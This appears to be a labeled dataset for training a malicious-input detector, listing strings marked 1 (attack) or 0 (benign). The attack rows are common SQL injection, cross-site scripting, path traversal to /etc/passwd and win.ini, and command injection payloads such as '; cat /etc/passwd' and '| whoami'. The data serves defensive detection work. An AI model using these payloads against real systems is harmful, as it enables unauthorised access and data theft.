s E l E c T * f R o M a d m i n,1
/blog?id=8181,0
<script>var a=157;alert(a)</script>,1
/dashboard?session=64922,0
<script>var a=287;alert(a)</script>,1
BpnaykXqGKGynt,0
' OR 8=8 --,1
../../../../etc/passwd,1
onerror=alert(1),1
lo7MQamG,0
gwociXEnizv,0
home,0
<script>alert(document.cookie)</script>,1
cpcqum3JKkAA,0
' OR 7=2 --,1
YxhbB6vkIKA1v3,0
<script>var a=463;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/checkout?id=2946,0
/blog?id=6808,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
/search?session=50008,0
index,0
../../../windows/win.ini,1
/contact?id=7086,0
/about?session=93029,0
javascript:alert(1),1
' OR 7=1 --,1
admin'/* bypass */OR 1=1,1
settings,0
/profile?id=1769,0
s E l E c T * f R o M a d m i n,1
user,0
<script>var a=975;alert(a)</script>,1
<script>var a=65;alert(a)</script>,1
' OR 5=2 --,1
/blog?session=17065,0
deXfOVQ1C,0
s E l E c T * f R o M a d m i n,1
/login?id=5172,0
/login?id=5130,0
/blog?session=38388,0
| whoami,1
/profile?id=5712,0
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
/index?session=32930,0
<script>var a=468;alert(a)</script>,1
/user?id=5462,0
/login?session=29934,0
<script>var a=462;alert(a)</script>,1
/cart?session=85703,0
' OR 6=1 --,1
/home?id=6293,0
/search?session=21400,0
/user?id=939,0
<script>var a=744;alert(a)</script>,1
' OR 4=7 --,1
admin' --,1
<script>var a=415;alert(a)</script>,1
UZZ2rHx7qz,0
' OR 1=1 --,1
search,0
../../../windows/win.ini,1
' OR '1'='1,1
../../../windows/win.ini,1
settings,0
/cart?id=4954,0
<script>var a=392;alert(a)</script>,1
<script>var a=753;alert(a)</script>,1
| whoami,1
1' o r '1'='1,1
xZ04cq96MatV,0
qWX6Kkzdw8,0
blog,0
javascript:alert(1),1
/blog?id=9134,0
/register?session=43205,0
/search?id=6200,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=42144,0
PCSNCNmdVXx,0
home,0
/login?id=5734,0
about,0
onerror=alert(1),1
checkout,0
/cart?session=66479,0
/checkout?session=91104,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?id=1185,0
' OR 7=2 --,1
dashboard,0
admin'/* bypass */OR 1=1,1
profile,0
/dashboard?id=5690,0
dashboard,0
' OR 6=5 --,1
' OR 1=1 --,1
<script>var a=638;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
search,0
KA1ZyNZqo1A,0
checkout,0
contact,0
p3OyWmu9,0
' OR 1=3 --,1
<script>var a=444;alert(a)</script>,1
/index?id=1356,0
1' o r '1'='1,1
login,0
/home?session=35909,0
BIIxlbtt8Hb,0
javascript:alert(1),1
2W7opzuysAM,0
/profile?id=3368,0
<script>var a=25;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
Z82Tp7vAHPGI,0
' OR 4=2 --,1
admin' --,1
1' o r '1'='1,1
<script>var a=382;alert(a)</script>,1
blog,0
1' o r '1'='1,1
user,0
' OR 8=1 --,1
<script>var a=185;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?id=7315,0
cart,0
user,0
s E l E c T * f R o M a d m i n,1
/settings?id=7658,0
' OR 9=4 --,1
admin' --,1
; cat /etc/passwd,1
/register?id=8752,0
' OR '1'='1,1
javascript:alert(1),1
4kcxup1wx0Bq,0
/login?session=59513,0
; cat /etc/passwd,1
../../../../etc/passwd,1
../../../../etc/passwd,1
profile,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?session=96992,0
' OR 3=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
/register?session=71893,0
profile,0
../../../../etc/passwd,1
search,0
profile,0
/settings?id=581,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
N9tArK99,0
/index?id=644,0
/profile?session=34270,0
/user?id=6493,0
/dashboard?session=60324,0
<script>var a=199;alert(a)</script>,1
5ggOqPUnhXcw,0
<script>var a=378;alert(a)</script>,1
5plyek7CgBXZODk,0
admin' --,1
/contact?id=4363,0
WhRO98a6Ro,0
profile,0
' OR '1'='1,1
; cat /etc/passwd,1
' OR 6=1 --,1
NzTwygexh7Kr1,0
/about?session=77411,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?session=91645,0
| whoami,1
| whoami,1
' OR 7=8 --,1
blog,0
checkout,0
register,0
../../../../etc/passwd,1
' OR 1=1 --,1
/login?session=88671,0
<script>var a=887;alert(a)</script>,1
' OR 1=1 --,1
nRMGygvugUmY,0
' OR 7=9 --,1
/cart?id=4768,0
contact,0
/index?session=45162,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
<script>var a=973;alert(a)</script>,1
VLapkely8LQdxej,0
| whoami,1
dashboard,0
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
contact,0
/register?session=99589,0
/register?session=63540,0
/register?id=8413,0
| whoami,1
<script>var a=197;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=914;alert(a)</script>,1
/user?id=3863,0
| whoami,1
' OR 8=3 --,1
../../../../etc/passwd,1
profile,0
../../../../etc/passwd,1
' OR 6=7 --,1
' OR 8=3 --,1
admin%00' OR 1=1,1
/dashboard?id=8712,0
; cat /etc/passwd,1
PzuZEl23KhKxYi,0
' OR 5=4 --,1
' OR 3=2 --,1
cart,0
1' o r '1'='1,1
cart,0
../../../windows/win.ini,1
Rn3Ur6ryy,0
admin'/* bypass */OR 1=1,1
settings,0
1' o r '1'='1,1
/index?id=1402,0
<script>var a=513;alert(a)</script>,1
<script>var a=48;alert(a)</script>,1
login,0
/register?session=91342,0
7fc4jewlTR,0
/settings?id=3752,0
admin' --,1
<script>var a=402;alert(a)</script>,1
/search?session=29766,0
search,0
' OR 1=1 --,1
<script>var a=224;alert(a)</script>,1
A5Ks1scEvm,0
/contact?id=6620,0
<script>var a=921;alert(a)</script>,1
3YiW9wzlzn3VFJw,0
' OR 5=6 --,1
user,0
' OR 2=9 --,1
/blog?id=2691,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
/settings?id=2625,0
jqiUrmcU,0
7hqLoQBKgyI1nd,0
' OR 6=6 --,1
contact,0
' OR '1'='1,1
/login?id=6653,0
; cat /etc/passwd,1
' OR 4=5 --,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
' OR 1=8 --,1
' OR '1'='1,1
/profile?id=4946,0
register,0
NEdSxP8WQH,0
' OR '1'='1,1
/index?session=18778,0
/user?id=325,0
/dashboard?session=70306,0
admin%00' OR 1=1,1
search,0
../../../../etc/passwd,1
z0S6tCrOYjzLLKK,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
yMVx2ghf,0
/register?id=5189,0
s E l E c T * f R o M a d m i n,1
<script>var a=294;alert(a)</script>,1
1' o r '1'='1,1
FQJDs1atHSq,0
deMTimt94rtvhf,0
blog,0
; cat /etc/passwd,1
JhBXEHmZ,0
about,0
eiUABAPtClon,0
admin%00' OR 1=1,1
' OR 3=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
../../../windows/win.ini,1
1' o r '1'='1,1
index,0
' OR 9=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
settings,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
settings,0
/login?session=13648,0
/about?id=3075,0
/register?session=15692,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=752;alert(a)</script>,1
onerror=alert(1),1
admin' --,1
<script>var a=855;alert(a)</script>,1
/user?id=5256,0
/index?session=47794,0
SP0ietV8BxNeMbn,0
login,0
' OR 1=4 --,1
4TX3qT9nDAydi,0
' OR 9=2 --,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=8727,0
/blog?id=4829,0
' OR 7=2 --,1
1' o r '1'='1,1
<script>var a=12;alert(a)</script>,1
<script>var a=883;alert(a)</script>,1
' OR 1=8 --,1
/blog?id=1324,0
/contact?id=1605,0
<script>var a=360;alert(a)</script>,1
; cat /etc/passwd,1
dashboard,0
' OR '1'='1,1
cart,0
<script>var a=940;alert(a)</script>,1
/home?session=41647,0
/search?session=82332,0
' OR 8=9 --,1
| whoami,1
<script>var a=331;alert(a)</script>,1
/login?id=4311,0
' OR 1=1 --,1
/dashboard?session=29387,0
7Moc6JNjFKUQnqe,0
YGwGJwEw00,0
' OR '1'='1,1
/settings?id=7910,0
/search?session=20301,0
checkout,0
/about?id=366,0
<script>var a=858;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=579;alert(a)</script>,1
../../../../etc/passwd,1
/settings?id=5473,0
<script>var a=343;alert(a)</script>,1
k9kbuck9QyjEqPS,0
/login?session=69742,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
/home?id=6930,0
' OR 2=9 --,1
s E l E c T * f R o M a d m i n,1
OLlXi2r5P,0
admin'/* bypass */OR 1=1,1
5zyYt2tCUZ,0
' OR 3=5 --,1
; cat /etc/passwd,1
' OR 6=2 --,1
/login?session=54589,0
/user?session=25746,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?id=5275,0
<script>var a=776;alert(a)</script>,1
qN6DgjRnR,0
contact,0
' OR 5=9 --,1
EjfJoRL0M,0
../../../../etc/passwd,1
index,0
' OR 1=6 --,1
' OR '1'='1,1
checkout,0
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=33597,0
Glaqn05iY7RRf,0
' OR 9=3 --,1
../../../../etc/passwd,1
' OR 8=6 --,1
/user?id=1481,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
/login?id=721,0
<script>var a=206;alert(a)</script>,1
onerror=alert(1),1
2vgF2XGMuy9ACK,0
/profile?session=98126,0
admin' --,1
blog,0
checkout,0
/user?session=43728,0
s E l E c T * f R o M a d m i n,1
VqCi4MySxhM7RW,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=1 --,1
<script>var a=124;alert(a)</script>,1
about,0
1Yz4VKIcfyocO,0
| whoami,1
s E l E c T * f R o M a d m i n,1
/user?session=68470,0
9xapgbk4s,0
<script>var a=876;alert(a)</script>,1
<script>var a=640;alert(a)</script>,1
jmQfu7gTB5K,0
admin' --,1
/profile?id=41,0
<script>var a=43;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
' OR 9=5 --,1
/home?id=4140,0
/search?id=9212,0
yAVeuRQHdQFKIq,0
| whoami,1
' OR 1=4 --,1
/user?session=42046,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=3 --,1
/login?session=17608,0
blog,0
admin%00' OR 1=1,1
w3Y2qe37vE,0
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
admin' --,1
/cart?session=11441,0
1' o r '1'='1,1
InV96yE3J0SZgU7,0
/user?session=94216,0
register,0
onerror=alert(1),1
/login?id=17,0
' OR 9=4 --,1
bqWHQCXTIGrxlc,0
/blog?session=71883,0
UYp1llbh,0
/user?session=85287,0
' OR '1'='1,1
../../../../etc/passwd,1
admin' --,1
' OR 8=8 --,1
login,0
JkEEsPILxdQc,0
admin'/* bypass */OR 1=1,1
/dashboard?id=629,0
settings,0
admin' --,1
<script>var a=397;alert(a)</script>,1
' OR 7=4 --,1
<script>var a=319;alert(a)</script>,1
<script>var a=333;alert(a)</script>,1
/contact?id=2619,0
index,0
' OR 3=8 --,1
<script>alert(document.cookie)</script>,1
' OR 3=9 --,1
index,0
<script>var a=741;alert(a)</script>,1
aDZY3rdpJUoNdL,0
' OR 2=5 --,1
/home?id=3915,0
../../../../etc/passwd,1
D8qmOXBDcPnvbGW,0
blog,0
/blog?session=54779,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=4096,0
gb6JExQJX4MjHgG,0
' OR 4=5 --,1
<script>var a=271;alert(a)</script>,1
/profile?session=66759,0
<script>var a=527;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 3=6 --,1
LeV8Q8Ok1DAU,0
' OR '1'='1,1
/blog?id=9257,0
/profile?session=36792,0
../../../../etc/passwd,1
admin' --,1
admin' --,1
yufoCBGjZSdjtMT,0
' OR '1'='1,1
' OR 4=5 --,1
/home?id=6008,0
/register?id=4278,0
settings,0
/login?session=23711,0
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
| whoami,1
yCK6UDnp7Tm5G,0
1' o r '1'='1,1
register,0
admin' --,1
7mrRVjaOI3G3W,0
<script>var a=286;alert(a)</script>,1
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
' OR 5=5 --,1
/settings?id=3978,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?session=15417,0
/blog?session=67653,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
home,0
; cat /etc/passwd,1
/about?session=39531,0
sfI7Bef5Ym,0
/register?id=2339,0
9QBE1WzUHRZAKfu,0
/dashboard?id=3690,0
<script>alert(document.cookie)</script>,1
/dashboard?session=83815,0
dashboard,0
' OR 5=2 --,1
/login?id=9975,0
/cart?session=94116,0
1' o r '1'='1,1
/register?id=9744,0
' OR 1=1 --,1
z3W5xFNYCmoaGIr,0
/checkout?session=33314,0
blog,0
register,0
/dashboard?id=8408,0
ZmsUSxKA,0
search,0
/dashboard?session=53773,0
/about?session=76875,0
checkout,0
p57Hbl1qy,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?session=46292,0
' OR 8=4 --,1
y5yEspUSnRDP,0
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
/blog?session=32095,0
; cat /etc/passwd,1
/about?session=15934,0
contact,0
/user?id=3387,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
/login?session=25343,0
' OR '1'='1,1
/contact?id=7781,0
/cart?id=39,0
onerror=alert(1),1
search,0
cart,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/user?id=6311,0
/profile?session=86016,0
' OR 7=4 --,1
../../../../etc/passwd,1
<script>var a=408;alert(a)</script>,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=579;alert(a)</script>,1
/dashboard?session=66489,0
<script>var a=580;alert(a)</script>,1
/search?session=17525,0
S4n1AtfE2KzcCz0,0
<script>var a=126;alert(a)</script>,1
admin' --,1
<script>alert(document.cookie)</script>,1
y9O1drOpo7g,0
/search?session=95309,0
| whoami,1
home,0
admin%00' OR 1=1,1
' OR 3=8 --,1
<script>var a=804;alert(a)</script>,1
checkout,0
D9kgOlRAkLdNF7G,0
' OR 1=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
<script>var a=752;alert(a)</script>,1
blog,0
/home?id=7807,0
admin'/* bypass */OR 1=1,1
3Zp7QeJH,0
../../../../etc/passwd,1
/index?session=34382,0
/index?session=34493,0
' OR 4=6 --,1
/register?id=5190,0
; cat /etc/passwd,1
profile,0
' OR 8=3 --,1
<script>var a=933;alert(a)</script>,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 3=1 --,1
<script>alert(document.cookie)</script>,1
index,0
admin'/* bypass */OR 1=1,1
/search?id=1067,0
/search?id=4182,0
/contact?session=29804,0
/contact?id=953,0
1' o r '1'='1,1
index,0
' OR 9=4 --,1
admin%00' OR 1=1,1
pPJJ6AY5l19e2C,0
profile,0
/user?id=3128,0
onerror=alert(1),1
f0Da3v18Z1,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=5 --,1
/home?session=23356,0
/checkout?id=1960,0
' OR 4=8 --,1
<script>var a=650;alert(a)</script>,1
WlngV0HP,0
settings,0
' OR '1'='1,1
dLZKVry5m4rcGAP,0
/login?id=1006,0
../../../windows/win.ini,1
/user?session=35577,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
/login?id=3193,0
s E l E c T * f R o M a d m i n,1
<script>var a=885;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=114;alert(a)</script>,1
4nYC9c7GDSq,0
admin%00' OR 1=1,1
/home?session=16784,0
admin'/* bypass */OR 1=1,1
' OR 2=6 --,1
/about?id=8501,0
' OR 2=2 --,1
' OR 5=8 --,1
' OR 5=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=210;alert(a)</script>,1
/home?id=9260,0
PRH2YsQjzwMPe,0
/user?id=4655,0
admin%00' OR 1=1,1
' OR 2=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=7302,0
about,0
/home?session=80037,0
<script>var a=629;alert(a)</script>,1
dashboard,0
<script>var a=532;alert(a)</script>,1
/profile?id=7923,0
| whoami,1
<script>alert(document.cookie)</script>,1
hSHPr9GB,0
/settings?id=813,0
/contact?session=41521,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
/cart?session=87147,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
cart,0
<script>var a=852;alert(a)</script>,1
<script>var a=201;alert(a)</script>,1
TgWyLF7weoulm3,0
/profile?id=2151,0
/blog?id=5575,0
' OR 1=1 --,1
' OR 4=3 --,1
' OR 1=1 --,1
QDqLGegVJm4nTZ,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
/profile?id=4303,0
' OR 9=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=5 --,1
index,0
dashboard,0
; cat /etc/passwd,1
register,0
/profile?id=9934,0
' OR 1=8 --,1
<script>var a=311;alert(a)</script>,1
' OR 6=3 --,1
about,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
' OR 4=5 --,1
<script>var a=818;alert(a)</script>,1
OpazOf6AkC,0
/about?id=2227,0
<script>alert(document.cookie)</script>,1
/home?session=17446,0
; cat /etc/passwd,1
373dsIqty,0
/login?session=20536,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
/home?id=4540,0
| whoami,1
../../../../etc/passwd,1
/login?id=7844,0
admin%00' OR 1=1,1
' OR 8=9 --,1
1UousKjltn2U4t,0
/contact?id=9608,0
iASqU0KElOE21VX,0
search,0
<script>alert(document.cookie)</script>,1
' OR 3=9 --,1
../../../../etc/passwd,1
' OR 1=1 --,1
../../../windows/win.ini,1
' OR 9=6 --,1
tNbzx8ZKZEV,0
s E l E c T * f R o M a d m i n,1
<script>var a=34;alert(a)</script>,1
<script>var a=80;alert(a)</script>,1
<script>var a=733;alert(a)</script>,1
admin%00' OR 1=1,1
user,0
<script>alert(document.cookie)</script>,1
<script>var a=12;alert(a)</script>,1
cart,0
/home?id=3401,0
contact,0
/user?session=18401,0
<script>var a=422;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?session=89075,0
/about?id=3599,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=5864,0
../../../../etc/passwd,1
/cart?id=775,0
search,0
user,0
wCVUyBlGBptOI,0
../../../../etc/passwd,1
tE9u8QPgg,0
/about?id=2119,0
/dashboard?id=3379,0
/register?id=1308,0
/settings?id=9227,0
../../../windows/win.ini,1
onerror=alert(1),1
/blog?id=1957,0
| whoami,1
admin%00' OR 1=1,1
LBMgeN9R32LY,0
<script>var a=480;alert(a)</script>,1
0wOeVKXBH9NK,0
JB9R1VjR7vLv,0
7FEhnJlabull9,0
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
admin' --,1
jpv78fvy1,0
contact,0
dashboard,0
home,0
/register?session=50114,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
KOhOHtZMqW4RG,0
onerror=alert(1),1
cart,0
| whoami,1
ePjZciMjsKHd7,0
/about?session=39399,0
<script>var a=613;alert(a)</script>,1
settings,0
<script>alert(document.cookie)</script>,1
s8o1HuoNElT,0
/search?id=3073,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
user,0
gNJWubzQ,0
/contact?session=98632,0
' OR 3=1 --,1
<script>var a=343;alert(a)</script>,1
/dashboard?session=43040,0
RHwu6lTUG3Zy8,0
search,0
javascript:alert(1),1
' OR 6=3 --,1
blog,0
1' o r '1'='1,1
/blog?session=58134,0
/checkout?session=24412,0
7zxPteNvjGRNM4,0
user,0
/search?id=7247,0
; cat /etc/passwd,1
; cat /etc/passwd,1
' OR 1=5 --,1
/user?id=3910,0
<script>var a=566;alert(a)</script>,1
/cart?session=69445,0
checkout,0
' OR 9=1 --,1
<script>var a=211;alert(a)</script>,1
<script>var a=591;alert(a)</script>,1
jX6Xnfbc,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=3 --,1
<script>var a=496;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
search,0
/checkout?session=19880,0
checkout,0
' OR 4=9 --,1
/blog?id=2166,0
/about?session=69893,0
<script>var a=550;alert(a)</script>,1
' OR 1=9 --,1
/dashboard?id=366,0
1' o r '1'='1,1
/register?id=8515,0
/profile?session=24822,0
/index?session=62497,0
/search?session=88805,0
' OR 3=1 --,1
/search?id=2576,0
/blog?id=9678,0
/checkout?session=73197,0
/about?id=8185,0
/register?session=31594,0
xUmTJyzsx5,0
' OR 3=3 --,1
cart,0
<script>var a=991;alert(a)</script>,1
l5zrJehJ,0
4A9Q9b2psWgz,0
/about?session=43475,0
cart,0
; cat /etc/passwd,1
' OR 3=3 --,1
<script>alert(document.cookie)</script>,1
/index?session=36591,0
<script>var a=411;alert(a)</script>,1
BLSHtprbZ4oM,0
/profile?id=2314,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?session=54407,0
5ZSjmHEBH7UH1,0
javascript:alert(1),1
/about?id=9499,0
/contact?id=9040,0
' OR 7=7 --,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=7 --,1
contact,0
user,0
' OR 3=5 --,1
admin'/* bypass */OR 1=1,1
DD2AJHx1,0
' OR 1=1 --,1
<script>var a=471;alert(a)</script>,1
' OR 9=8 --,1
register,0
<script>var a=198;alert(a)</script>,1
you8ablp,0
' OR 1=1 --,1
../../../../etc/passwd,1
<script>var a=69;alert(a)</script>,1
settings,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
' OR 8=4 --,1
<script>var a=222;alert(a)</script>,1
/home?session=60472,0
onerror=alert(1),1
/checkout?session=68638,0
sebKj7nC,0
' OR 5=5 --,1
/index?id=6973,0
user,0
/profile?id=911,0
cart,0
<script>var a=804;alert(a)</script>,1
' OR 4=2 --,1
/index?id=6470,0
javascript:alert(1),1
../../../../etc/passwd,1
' OR 1=1 --,1
<script>var a=715;alert(a)</script>,1
n21e43EoiU,0
/user?id=5218,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=5 --,1
<script>alert(document.cookie)</script>,1
register,0
onerror=alert(1),1
user,0
/register?session=39868,0
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=145;alert(a)</script>,1
; cat /etc/passwd,1
javascript:alert(1),1
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
jGWaZ3WxNzIes1K,0
' OR 6=8 --,1
' OR '1'='1,1
' OR 8=1 --,1
' OR 3=7 --,1
/contact?session=31352,0
/contact?id=2447,0
' OR 1=2 --,1
; cat /etc/passwd,1
../../../../etc/passwd,1
/search?id=162,0
' OR 8=1 --,1
profile,0
/about?id=3472,0
/home?session=60231,0
/register?session=74166,0
/user?session=57780,0
/search?session=92486,0
<script>var a=935;alert(a)</script>,1
/about?session=86922,0
<script>var a=690;alert(a)</script>,1
1' o r '1'='1,1
search,0
1' o r '1'='1,1
' OR 2=5 --,1
<script>var a=257;alert(a)</script>,1
/user?id=9592,0
' OR 4=6 --,1
/profile?session=62276,0
VU4HAvg0,0
admin' --,1
' OR 5=4 --,1
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
' OR 9=5 --,1
8ZVtPkgNQabV9D,0
' OR 4=9 --,1
settings,0
<script>var a=786;alert(a)</script>,1
register,0
; cat /etc/passwd,1
' OR 3=5 --,1
l6PKSZ8kaBnuqy,0
/dashboard?id=4875,0
' OR 6=2 --,1
/home?id=2187,0
' OR 1=1 --,1
/register?session=51361,0
' OR 1=4 --,1
/login?id=9036,0
<script>var a=267;alert(a)</script>,1
/register?id=4815,0
/search?id=1703,0
' OR 1=1 --,1
' OR 1=3 --,1
<script>var a=742;alert(a)</script>,1
5Zs3wcjD1TuB2yh,0
javascript:alert(1),1
../../../windows/win.ini,1
/contact?session=14590,0
kytlOsywu,0
' OR 1=1 --,1
<script>var a=266;alert(a)</script>,1
cart,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
| whoami,1
onerror=alert(1),1
/dashboard?session=14735,0
javascript:alert(1),1
<script>var a=831;alert(a)</script>,1
; cat /etc/passwd,1
' OR 5=1 --,1
/settings?session=40134,0
contact,0
/settings?session=23840,0
../../../windows/win.ini,1
<script>var a=66;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=248;alert(a)</script>,1
/settings?id=5603,0
' OR 3=9 --,1
<script>alert(document.cookie)</script>,1
/profile?session=29148,0
/search?session=45143,0
admin%00' OR 1=1,1
/home?session=47490,0
/settings?id=2233,0
' OR 1=5 --,1
<script>var a=521;alert(a)</script>,1
' OR 4=7 --,1
' OR 4=2 --,1
kRbz8b4xgE,0
admin' --,1
IgzOcWUDVDh,0
login,0
/register?id=2544,0
../../../../etc/passwd,1
about,0
' OR 1=1 --,1
admin%00' OR 1=1,1
jiUjNdWT4f,0
search,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
d2y1RKjlxkx6,0
login,0
; cat /etc/passwd,1
lauWrt0SrW0aYm6,0
8vjf3nqn,0
<script>alert(document.cookie)</script>,1
/login?session=15063,0
contact,0
javascript:alert(1),1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
' OR 3=2 --,1
| whoami,1
/checkout?id=136,0
/index?session=53232,0
<script>var a=938;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
/profile?id=426,0
| whoami,1
<script>alert(document.cookie)</script>,1
/index?id=8393,0
user,0
dc5LXgto,0
<script>var a=445;alert(a)</script>,1
; cat /etc/passwd,1
' OR 1=3 --,1
register,0
/settings?session=30318,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
/contact?id=2117,0
../../../windows/win.ini,1
lt3Ys7s6SuKglu0,0
profile,0
<script>var a=72;alert(a)</script>,1
admin' --,1
' OR 1=1 --,1
' OR 1=7 --,1
' OR 2=6 --,1
f6pGGmJjipy,0
72ACnqijVgvsIj,0
' OR 4=1 --,1
' OR 3=2 --,1
1g8wKV3hafAM,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
mVUSjoMa,0
' OR 1=3 --,1
/about?id=1967,0
javascript:alert(1),1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
index,0
user,0
1' o r '1'='1,1
| whoami,1
admin'/* bypass */OR 1=1,1
YyyfYkrGtM7H86,0
WQLooTnd,0
yQ3NyeoS,0
YsgbdT7oAD,0
/profile?id=1580,0
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
/home?session=76899,0
s E l E c T * f R o M a d m i n,1
| whoami,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
checkout,0
' OR 7=6 --,1
/settings?session=11513,0
' OR 1=1 --,1
admin' --,1
admin%00' OR 1=1,1
<script>var a=884;alert(a)</script>,1
/index?session=21214,0
admin'/* bypass */OR 1=1,1
jlnv3K3JlX,0
admin' --,1
' OR 1=1 --,1
' OR '1'='1,1
' OR '1'='1,1
checkout,0
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=8 --,1
/profile?id=9558,0
' OR 9=6 --,1
/settings?session=47173,0
/dashboard?session=60984,0
